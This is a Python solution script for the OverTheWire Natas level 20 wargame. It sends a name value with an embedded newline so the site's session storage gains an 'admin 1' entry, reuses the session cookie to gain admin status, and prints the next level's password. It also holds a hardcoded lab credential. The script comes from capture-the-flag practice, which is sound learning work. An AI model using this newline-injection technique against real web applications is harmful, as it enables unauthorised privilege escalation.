import requests
import re

target = 'http://natas20.natas.labs.overthewire.org'
auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

print("Inyecting input...")
params = dict(name='admin\nadmin 1', debug='')
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
part = re.findall("Login.*for natas21", r.text)
print(part[0])

print("PHPSESSID: " + phpsessid)


print("\n\n")
print("Sending request with manipulated phpsessid...")
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
part = re.findall("You.*admin", r.text)
username = "natas21"
password = re.findall("Password.*</", r.text)
# part2 = re.findall()
print(part[0])
print("Username: " + username +"\n" + password[0][:-2])

